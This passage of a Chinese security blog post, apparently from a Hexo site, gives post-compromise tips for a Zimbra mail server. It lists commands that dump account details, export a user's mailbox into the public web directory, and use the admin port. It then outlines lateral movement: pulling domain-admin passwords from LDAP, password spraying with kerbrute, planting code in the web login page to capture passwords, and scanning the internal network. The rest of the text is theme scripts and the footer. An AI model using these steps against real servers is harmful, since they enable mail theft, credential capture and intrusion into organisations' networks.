+<h5 id="9-查询用户详情："><a href="#9-查询用户详情：" class="headerlink" title="9.查询用户详情："></a>9.查询用户详情：</h5><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs graphql">/opt/zimbra/bin/zmsoap -z -v SearchDirectoryRequest <span class="hljs-meta">@offset</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;0&quot;</span> <span class="hljs-meta">@limit</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;5000&quot;</span> <span class="hljs-meta">@sortBy</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;name&quot;</span> <span class="hljs-meta">@sortAscending</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;1&quot;</span> <span class="hljs-meta">@applyCos</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;false&quot;</span> <span class="hljs-meta">@applyConfig</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;false&quot;</span> <span class="hljs-meta">@attrs</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;givenName,displayName,zimbraAccountStatus,sn,cn,description,ZimbraCreateTimestamp,zimbraCOSId,zimbraLastLogonTimestamp&quot;</span> <span class="hljs-meta">@types</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;accounts&quot;</span> <span class="hljs-meta">@maxResults</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;5000&quot;</span> <span class="hljs-keyword">query</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="10-导出邮件的方法："><a href="#10-导出邮件的方法：" class="headerlink" title="10.导出邮件的方法："></a>10.导出邮件的方法：</h5><h6 id="（1）命令导出："><a href="#（1）命令导出：" class="headerlink" title="（1）命令导出："></a>（1）命令导出：</h6><p>导出指定时间的邮件 DD&#x2F;MM&#x2F;YY</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmmailbox -z -m test123@mail.test.com getRestURL <span class="hljs-string">&quot;//?fmt=tgz&amp;query=after:07/06/2023&quot;</span> &gt; <span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/zimbra/</span><span class="hljs-keyword">public</span>/test123.tar<br></code></pre></td></tr></table></figure>
+
+<h6 id="（2）账号密码"><a href="#（2）账号密码" class="headerlink" title="（2）账号密码"></a>（2）账号密码</h6><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">登录web导出<br>foxmail导出(pop3<span class="hljs-built_in"> or </span>imap/smtp)<br></code></pre></td></tr></table></figure>
+
+<h6 id="（3）7071端口导出（仅需管理员账号和密码）"><a href="#（3）7071端口导出（仅需管理员账号和密码）" class="headerlink" title="（3）7071端口导出（仅需管理员账号和密码）"></a>（3）7071端口导出（仅需管理员账号和密码）</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//m</span>ail.test.com:<span class="hljs-number">7071</span> <br></code></pre></td></tr></table></figure>
+
+<h5 id="11-zimbra邮件服务器的横向移动，扩大战果"><a href="#11-zimbra邮件服务器的横向移动，扩大战果" class="headerlink" title="11.zimbra邮件服务器的横向移动，扩大战果"></a>11.zimbra邮件服务器的横向移动，扩大战果</h5><p>（1）查看邮服ldap文件，如果zimbra邮件服务器配置了域控，就会存在域管密码，拿下域管结束。</p>
+<p>（2）将ldap中的邮箱全部用户名拖取出来（拖取全局联系人），扫描内网ldap端口，进行域用户枚举，然后进行密码喷洒，工具：<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute%E3%80%82">https://github.com/ropnop/kerbrute。</a></p>
+<p>（3）恶意代码捕获web界面密码，有可能捕获到域管密码，尝试登录，或者对普通用户操作，就是想法设法扩大战果。</p>
+<p>（3）扫内网，定位核心段等等。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Zimbra/" class="category-chain-item">Zimbra</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Tips/">#Tips</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/04/targetXX/" title="实战——利用XX盘开发者留的后门get websell">
+                        <span class="hidden-mobile">实战——利用XX盘开发者留的后门get websell</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span> © 2023 </span> <a href="https://b11c.github.io" target="_blank" rel="nofollow noopener"><span>b11c</span></a> <span>Powered by</span> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+<span> & </span> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
